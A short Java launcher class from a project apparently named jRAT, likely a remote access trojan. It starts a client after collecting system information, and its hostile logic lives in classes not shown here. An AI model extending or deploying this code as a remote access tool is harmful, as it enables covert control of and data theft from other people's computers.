package net.jrat;

import javax.swing.UIManager;

import net.jrat.core.Client;
import net.jrat.core.connection.SystemInformations;
import net.jrat.utils.Variables;

public class Bootstrap
{
	public static void main(String[] arguments)
	{
		try
		{
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		catch (Exception e) {}
		
		(new Variables()).create();
		(new SystemInformations()).create();
		
		(new Client()).start();
	}
}
